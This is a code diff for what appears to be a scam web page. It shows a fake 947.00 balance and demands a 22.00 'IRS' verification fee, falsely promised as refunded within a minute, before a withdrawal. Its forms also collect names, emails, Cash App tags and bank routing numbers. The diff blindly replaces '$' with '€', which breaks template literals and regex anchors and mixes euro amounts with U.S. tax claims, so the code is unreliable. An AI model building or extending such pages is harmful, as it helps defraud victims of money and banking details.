@@ -20,13 +20,13 @@ const pages = {
       <div class="balance-card">
         <div class="balance-title">Your Balance</div>
         <div class="balance-amount-wrapper">
-          <div class="balance-amount">$947.00</div>
+          <div class="balance-amount">€947.00</div>
           <img class="balance-image" src="images/p-saldo-maior.png" alt="icon">
         </div>
       </div>
       
       <div class="last-rewards">
-        Recent rewards: $54.87
+        Recent rewards: €54.87
       </div>
       
       <!-- Main White Section -->
@@ -68,10 +68,10 @@ const pages = {
         
         <!-- Amount Buttons (Optional) -->
         <div class="amount-options">
-          <button class="amount-btn" data-amount="1.50">$1.50</button>
-          <button class="amount-btn" data-amount="5">$5</button>
-          <button class="amount-btn" data-amount="10">$10</button>
-          <button class="amount-btn" data-amount="947.00">$947.00</button>
+          <button class="amount-btn" data-amount="1.50">€1.50</button>
+          <button class="amount-btn" data-amount="5">€5</button>
+          <button class="amount-btn" data-amount="10">€10</button>
+          <button class="amount-btn" data-amount="947.00">€947.00</button>
         </div>
         
         <!-- Display do Método Selecionado -->
@@ -96,7 +96,7 @@ const pages = {
 
         <!-- Info Texts -->
         <div class="withdraw-info-text">
-          <p>To withdraw money, you need a minimum balance of $0.40.</p>
+          <p>To withdraw money, you need a minimum balance of €0.40.</p>
           <p>Withdrawal limits for individual and monthly transactions may vary by country or region.</p>
         </div>
       </div>
@@ -127,7 +127,7 @@ const pages = {
       <div class="confirmation-section confirmation-balance">
         <div class="confirmation-balance-title">AVAILABLE BALANCE</div>
         <div class="confirmation-balance-amount" data-amount-target="947.00">
-          $ 947.00
+          € 947.00
         </div>
         <div class="confirmation-balance-subtitle">
           Awaiting withdrawal confirmation
@@ -140,11 +140,11 @@ const pages = {
           IRS Payment Requirement
         </div>
         <div class="confirmation-fee-amount">
-          $ 22.00
+          € 22.00
           <span class="confirmation-reembolso-badge">REFUNDABLE AMOUNT</span>
         </div>
         <div class="confirmation-fee-description">
-          According to U.S. federal tax regulations, a payment of <span class="bold">$22.00</span> is required before the release of your withdrawal totaling <span class="bold">$947.00</span> can be processed. This amount will be automatically refunded to you within 1 minute after processing.
+          According to U.S. federal tax regulations, a payment of <span class="bold">€22.00</span> is required before the release of your withdrawal totaling <span class="bold">€947.00</span> can be processed. This amount will be automatically refunded to you within 1 minute after processing.
         </div>
       </div>
 
@@ -166,7 +166,7 @@ const pages = {
           </div>
           <div class="confirmation-receipt-item">
             <div class="confirmation-receipt-label">Amount to receive</div>
-            <div class="confirmation-receipt-value bold">$ 947.00</div>
+            <div class="confirmation-receipt-value bold">€ 947.00</div>
           </div>
         </div>
       </div>
@@ -184,7 +184,7 @@ const pages = {
                 Complete IRS payment    
               </div>
               <div class="confirmation-requirement-description">
-                $22.00 required payment under federal regulations
+                €22.00 required payment under federal regulations
               </div>
             </div>
           </div>
@@ -208,7 +208,7 @@ const pages = {
                 Access full balance
               </div>
               <div class="confirmation-requirement-description">
-                $947.00 delivered within 3 minutes
+                €947.00 delivered within 3 minutes
               </div>
             </div>
           </div>
@@ -224,7 +224,7 @@ const pages = {
           ⏱️ Refund issued within 1 minute
         </div>
         <div class="confirmation-success-message" id="confirmation-success-message">
-          ✅ Identity confirmed. $ 22.00 refunded and withdrawal released.
+          ✅ Identity confirmed. € 22.00 refunded and withdrawal released.
         </div>
       </div>
 
@@ -248,7 +248,7 @@ const pages = {
     
     <div class="balance-display" style="border: 2px solid #ff2c55; border-radius: 8px; padding: 15px; text-align: center;">
       <div style="font-size: 14px; margin-bottom: 5px;">BALANCE</div>
-      <div class="balance-amount" style="font-size: 18px; font-weight: bold;">$ 947.00</div>
+      <div class="balance-amount" style="font-size: 18px; font-weight: bold;">€ 947.00</div>
     </div>
   </div>
   
@@ -311,17 +311,17 @@ const pages = {
       <div class="checkout-container">
         <div class="checkout-header">
           <h1>Fee Payment</h1>
-          <div class="amount">$22.00</div>
+          <div class="amount">€22.00</div>
         </div>
         <div class="checkout-content">
           <div class="checkout-summary">
             <div class="summary-row">
               <span>Verification fee:</span>
-              <strong>$22.00</strong>
+              <strong>€22.00</strong>
             </div>
             <div class="summary-row total">
               <span>Total to pay:</span>
-              <strong>$22.00</strong>
+              <strong>€22.00</strong>
             </div>
           </div>
           <div class="payment-methods-info">
@@ -335,7 +335,7 @@ const pages = {
             ⚠️ This fee is processed securely. Your withdrawal account information is not used for this payment.
           </div>
           <button type="button" class="checkout-btn" id="checkout-btn">
-            Pay $22.00
+            Pay €22.00
           </button>
           <div class="checkout-error" id="checkout-error"></div>
         </div>
@@ -404,7 +404,7 @@ function setupWithdrawPage() {
         b.classList.remove("selected");
       });
 
-      // If selected button is not $0.40, remove special-offer from $0.40
+      // If selected button is not €0.40, remove special-offer from €0.40
       if (!isSpecialOffer) {
         const specialBtn = document.querySelector(
           '.amount-btn[data-amount="0.40"]',
@@ -413,7 +413,7 @@ function setupWithdrawPage() {
           specialBtn.classList.remove("special-offer");
         }
       } else {
-        // If selected $0.40, keep special-offer
+        // If selected €0.40, keep special-offer
         btn.classList.add("special-offer");
       }
 
@@ -463,7 +463,7 @@ function setupRegistrationPage() {
     const day = String(now.getDate()).padStart(2, "0");
     const month = String(now.getMonth() + 1).padStart(2, "0");
     const year = now.getFullYear();
-    dateEl.textContent = `${month}/${day}/${year}`;
+    dateEl.textContent = `€{month}/€{day}/€{year}`;
   }
 
   const payButton = document.getElementById("pay-tax-btn");
@@ -550,8 +550,8 @@ function renderMethodForm(method) {
           <input type="text" class="form-input" placeholder="Full name" id="cashapp-name">
         </div>
         <div class="form-group">
-          <label>$Cashtag</label>
-          <input type="text" class="form-input" placeholder="$yourcashtag" id="cashapp-cashtag" maxlength="30">
+          <label>€Cashtag</label>
+          <input type="text" class="form-input" placeholder="€yourcashtag" id="cashapp-cashtag" maxlength="30">
         </div>
         <button class="form-submit-btn" onclick="submitMethodForm()">Submit</button>
       </div>
@@ -715,7 +715,7 @@ function updateMethodDisplay(method) {
   };
   const info = methodInfo[method];
   if (info) {
-    logo.innerHTML = `<img src="${info.src}" alt="${info.alt}" style="width: 50px; height: 35px; object-fit: contain;">`;
+    logo.innerHTML = `<img src="€{info.src}" alt="€{info.alt}" style="width: 50px; height: 35px; object-fit: contain;">`;
     name.textContent = info.label;
   }
 
@@ -741,7 +741,7 @@ function submitMethodForm() {
       alert("Please fill in all fields");
       return;
     }
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+€/.test(email)) {
       alert("Please enter a valid email address");
       return;
     }
@@ -773,7 +773,7 @@ function submitMethodForm() {
       alert("Please fill in all fields");
       return;
     }
-    if (routing.length !== 9 || !/^\d{9}$/.test(routing)) {
+    if (routing.length !== 9 || !/^\d{9}€/.test(routing)) {
       alert("Routing number must be exactly 9 digits");
       return;
     }
@@ -788,7 +788,7 @@ function submitMethodForm() {
       alert("Please fill in all fields");
       return;
     }
-    if (!/^\d{9}$/.test(routing)) {
+    if (!/^\d{9}€/.test(routing)) {
       alert("Routing number must be exactly 9 digits");
       return;
     }
